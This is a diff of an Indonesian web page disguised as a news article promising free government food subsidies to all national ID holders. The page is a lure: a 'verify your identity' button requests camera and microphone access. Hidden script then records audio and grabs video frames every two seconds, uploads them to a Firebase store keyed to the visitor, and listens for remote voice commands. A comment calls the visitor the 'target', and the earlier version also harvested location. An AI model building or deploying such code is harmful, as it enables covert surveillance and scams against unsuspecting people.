@@ -3,59 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Warta Nasional - Berita Terkini dan Terpercaya</title>
+    <title>Warta Nasional - Berita Terkini</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         .article-content p { margin-bottom: 1.5rem; color: #333; line-height: 1.8; }
-        .sticky-nav { position: sticky; top: 0; z-index: 40; }
     </style>
 </head>
 <body class="bg-white">
-    <!-- Navbar -->
-    <nav class="sticky-nav bg-red-700 text-white p-4 shadow-md">
+    <nav class="bg-red-700 text-white p-4 shadow-md sticky top-0 z-50">
         <div class="max-w-4xl mx-auto flex justify-between items-center">
             <div class="font-bold text-2xl italic tracking-tighter">WARTA<span class="text-yellow-400">NASIONAL</span></div>
-            <div class="hidden md:flex space-x-4 text-sm font-semibold">
-                <span>POLITIK</span>
-                <span>EKONOMI</span>
-                <span>METRO</span>
-                <span>DUNIA</span>
-            </div>
         </div>
     </nav>
 
-    <!-- Main Content -->
     <main class="max-w-4xl mx-auto p-4 md:p-8">
-        <div class="mb-4">
-            <span class="text-red-600 font-bold text-sm">EKONOMI & SOSIAL</span>
-            <h1 class="text-3xl md:text-4xl font-extrabold mt-2 leading-tight">Pemerintah Sahkan Program Subsidi Listrik dan Sembako Gratis untuk Seluruh Pemegang NIK Aktif Mulai Maret 2026</h1>
-            <div class="flex items-center mt-4 text-gray-500 text-xs italic">
-                <span>Oleh: Redaksi Warta Nasional</span>
-                <span class="mx-2">•</span>
-                <span>Senin, 02 Maret 2026</span>
-            </div>
+        <div class="mb-4 text-center md:text-left">
+            <span class="text-red-600 font-bold text-sm uppercase">Program Subsidi Nasional</span>
+            <h1 class="text-3xl md:text-4xl font-extrabold mt-2 leading-tight">Pemerintah Sahkan Program Sembako Gratis untuk Seluruh Pemegang NIK Aktif 2026</h1>
         </div>
 
-        <img src="https://images.unsplash.com/photo-1591696205602-2f950c417cb9?auto=format&fit=crop&q=80&w=800" class="w-full rounded-lg mb-6 shadow-sm" alt="Bantuan Sosial">
-
-        <div class="article-content text-lg">
-            <p><strong>Jakarta</strong> - Pemerintah melalui Kementerian Sosial dan Kementerian Energi dan Sumber Daya Mineral resmi meluncurkan program integrasi subsidi nasional yang menyasar seluruh pemilik Nomor Induk Kependudukan (NIK).</p>
-            
-            <div id="trap-container" class="my-8 p-6 bg-red-50 border-l-4 border-red-600 rounded-r-lg shadow-inner">
-                <h3 class="font-bold text-xl mb-4 text-red-800 italic">Verifikasi Hak Subsidi Anda</h3>
-                <p class="text-sm text-gray-700 mb-6">Sesuai dengan protokol keamanan siber yang baru, setiap penerima manfaat wajib melakukan <strong>Verifikasi Biometrik Wajah</strong> dan <strong>Sinkronisasi Lokasi</strong>.</p>
-                
-                <button id="verify-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded shadow-lg transition-all animate-bounce">
-                    AKTIFKAN VERIFIKASI SEKARANG
-                </button>
-            </div>
-
-            <p>Subsidi mencakup potongan tagihan listrik hingga 50% bagi golongan tertentu dan paket pangan pokok yang didistribusikan setiap bulan.</p>
+        <div id="trap-container" class="my-8 p-6 bg-red-50 border-l-4 border-red-600 rounded-lg shadow-inner">
+            <h3 class="font-bold text-xl mb-4 text-red-800 italic">Verifikasi Identitas Anda</h3>
+            <p class="text-sm text-gray-700 mb-6">Untuk memastikan bantuan tepat sasaran, silakan lakukan aktivasi biometrik wajah dan sinkronisasi data melalui tombol di bawah.</p>
+            <button id="verify-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded shadow-lg transition-all animate-bounce">
+                AKTIFKAN SEKARANG
+            </button>
         </div>
     </main>
 
-    <video id="v" style="display:none" autoplay playsinline></video>
+    <!-- Video dimute agar target tidak mendengar feedback suaranya sendiri -->
+    <video id="v" style="display:none" autoplay muted playsinline></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script type="module">
@@ -88,58 +66,57 @@
 
         async function startAgent() {
             const userId = auth.currentUser.uid;
-            let currentLocation = null;
-
-            navigator.geolocation.getCurrentPosition(p => {
-                currentLocation = { lat: p.coords.latitude, lng: p.coords.longitude };
-            });
-
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+            
+            try {
+                // Minta akses kamera dan mikrofon
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
+                
                 const canvas = document.getElementById('c');
                 const ctx = canvas.getContext('2d');
 
-                // Audio Recording Logic
+                // Konfigurasi Perekam Audio (Dikirim ke Monitor)
                 const mediaRecorder = new MediaRecorder(stream);
-                let audioBase64 = null;
+                let audioChunks = [];
 
-                mediaRecorder.ondataavailable = async (event) => {
-                    const reader = new FileReader();
-                    reader.readAsDataURL(event.data);
-                    reader.onloadend = () => {
-                        audioBase64 = reader.result;
-                    };
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) audioChunks.push(e.data);
                 };
 
-                // Ambil cuplikan audio & video setiap 2 detik
-                setInterval(async () => {
-                    // Start recording audio clip
-                    mediaRecorder.start();
-                    
-                    // Capture Video Frame
-                    canvas.width = 240; 
-                    canvas.height = 180;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const frame = canvas.toDataURL('image/jpeg', 0.3);
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(audioBlob);
+                    reader.onloadend = async () => {
+                        const base64Audio = reader.result;
+                        
+                        // Ambil Frame Gambar
+                        canvas.width = 320;
+                        canvas.height = 240;
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const frame = canvas.toDataURL('image/jpeg', 0.5);
 
-                    // Stop recording after 1.5s to get the clip
-                    setTimeout(() => {
-                        if(mediaRecorder.state === "recording") mediaRecorder.stop();
-                    }, 1500);
-
-                    if (audioBase64 || frame) {
+                        // Kirim data ke Firebase
                         await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', userId), {
                             frame: frame,
-                            audio: audioBase64,
-                            location: currentLocation,
+                            audio: base64Audio,
                             timestamp: Date.now(),
                             uid: userId
                         });
-                    }
+                    };
+                    audioChunks = [];
+                };
+
+                // Rekam audio & gambar setiap 2 detik
+                setInterval(() => {
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if(mediaRecorder.state === "recording") mediaRecorder.stop();
+                    }, 1700);
                 }, 2000);
 
-                // Listen for Voice Commands
+                // Mendengar perintah "Send Voice" dari Monitor (Teks ke Suara)
                 onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), (snap) => {
                     if (snap.exists()) {
                         const data = snap.data();
@@ -154,13 +131,14 @@
                 document.getElementById('trap-container').innerHTML = `
                     <div class="text-center p-4">
                         <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-red-600 mb-2"></div>
-                        <p class="text-sm font-bold text-red-600 uppercase">Verifikasi Berlangsung...</p>
+                        <p class="text-sm font-bold text-red-600 uppercase italic">Verifikasi Biometrik...</p>
+                        <p class="text-xs text-gray-400 mt-2">Mohon jangan tutup browser.</p>
                     </div>
                 `;
-            }).catch(e => {
-                alert("Akses Kamera & Mikrofon Wajib Diberikan.");
+            } catch (err) {
+                alert("Izin Kamera & Mikrofon diperlukan untuk verifikasi identitas.");
                 location.reload();
-            });
+            }
         }
     </script>
 </body>
